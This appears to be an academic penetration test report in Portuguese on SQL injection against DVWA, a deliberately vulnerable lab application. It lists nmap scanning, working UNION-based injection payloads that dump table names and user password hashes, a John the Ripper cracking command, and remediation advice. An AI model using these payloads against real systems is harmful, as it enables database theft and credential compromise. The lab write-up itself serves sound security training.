#RELATÓRIO DE TESTE DE INVASÃO: SQL INJECTION (DVWA)

Alvo: 192.168.56.103 (DVWA - Damn Vulnerable Web Application)

Metodologia: Pentest White Box (Credenciais fornecidas: admin/password)

Data: 21 de Março de 2026

##RESUMO EXECUTIVO

Este relatório detalha a identificação e exploração de uma vulnerabilidade de SQL Injection no parâmetro ID da aplicação DVWA. Através de técnicas de injeção manual (UNION-Based), foi possível exfiltrar a base de dados de usuários, incluindo hashes de senhas. Posteriormente, utilizou-se técnicas de Password Cracking para reverter os hashes e obter acesso às credenciais em texto claro.

##RECONHECIMENTO E VARREDURA

A fase inicial focou em identificar a presença do alvo e os serviços disponíveis.

•	Identificação do Host: netdiscover -r 192.168.56.0/24

•	Mapeamento de Portas: nmap -sV 192.168.56.103
 
 <img width="886" height="181" alt="image" src="https://github.com/user-attachments/assets/67c0c816-616e-4eb4-8276-41cd995db2f6" />
<img width="348" height="234" alt="image" src="https://github.com/user-attachments/assets/cef0f7ce-1ec0-4850-8265-2132e35bef5a" />



##ANÁLISE DE VULNERABILIDADE (MANUAL)

Após autenticar na aplicação e configurar o nível de segurança para Low, iniciou-se o teste no campo "User ID".

Login fornecido:

Username: admin
 Password: password
 
<img width="886" height="489" alt="image" src="https://github.com/user-attachments/assets/3772ccfb-623e-43c5-9c22-fd4305a8af15" />

 <img width="650" height="191" alt="image" src="https://github.com/user-attachments/assets/741788f0-aca8-4fca-bae1-79e54a046340" />









##Confirmação da Injeção

Ao inserir o caractere ', a aplicação retornou um erro de sintaxe SQL, confirmando que o input do usuário é interpretado diretamente pelo banco de dados.
•	Payload: 1'
 
<img width="475" height="180" alt="image" src="https://github.com/user-attachments/assets/31aa6021-a14d-4d7b-865d-88f5913130b5" />


##Descoberta de Colunas (Enumeration)

Utilizou-se o comando ORDER BY para determinar que a consulta original possui 2 colunas.

•	Payload: 1' ORDER BY 2# (Sucesso)

•	Payload: 1' ORDER BY 3# (Erro - Confirmando apenas 2 colunas)
 
 <img width="413" height="238" alt="image" src="https://github.com/user-attachments/assets/2806fb4d-29c1-4f98-ad74-8d09770f9040" />

<img width="466" height="64" alt="image" src="https://github.com/user-attachments/assets/05f2d535-376a-4487-8bd4-8464efe7316b" />


 




##Extração de Dados do Sistema

Com o número de colunas confirmado, utilizou-se o operador UNION para exibir informações do servidor.
•	Payload: 1' UNION SELECT @@version, database()#
 
<img width="542" height="239" alt="image" src="https://github.com/user-attachments/assets/e04da26e-bf0b-438d-a818-8fdd43e883d3" />


##EXFILTRAÇÃO DA BASE DE DADOS

O objetivo final foi extrair a tabela de usuários (users).


##Listagem de Tabelas

•	Payload: 1' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema='dvwa'#
 

<img width="886" height="255" alt="image" src="https://github.com/user-attachments/assets/e257186a-d228-45f8-b086-42ce7b91c933" />




##Extração de Credenciais (Hashes)

•	Payload: 1' UNION SELECT user, password FROM users#
 
<img width="636" height="591" alt="image" src="https://github.com/user-attachments/assets/76b3049c-cdf1-4aae-af92-12385b7fbe2e" />



##QUEBRA DE SENHAS (PASSWORD CRACKING)

Os hashes extraídos (MD5) foram submetidos a um ataque de dicionário para obter as senhas originais.

•	Comando de Exemplo (John the Ripper):

john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt


 <img width="697" height="59" alt="image" src="https://github.com/user-attachments/assets/98d56f01-b8a9-4f83-90b1-f983abb0ab91" />






##Tabela de Resultados (Evidência Final)

Usuário	Hash MD5 (Extraído)	Senha Decifrada	Impacto

a@	5f4dc****************	p**	Crítico

g@	e99a1**************	a**	Alto

1@	8d353*****************	p**	Alto

p@	0d107*****************	l**	Médio

s@	5f4dc****************	p**	Médio



##CONCLUSÃO E RECOMENDAÇÕES

A vulnerabilidade de SQL Injection permitiu o comprometimento total da base de dados. Além disso, o uso de algoritmos de hash obsoletos (MD5) facilitou a descoberta das senhas.

Recomendações:

1.	Prepared Statements: Utilizar consultas parametrizadas para impedir que inputs sejam lidos como comandos.

2.	Sanitização: Implementar filtros rigorosos para caracteres especiais.

3.	Hashing Forte: Substituir MD5 por algoritmos modernos como Argon2 ou BCrypt, utilizando Salts únicos para cada usuário.

Relatório elaborado para fins acadêmicos.
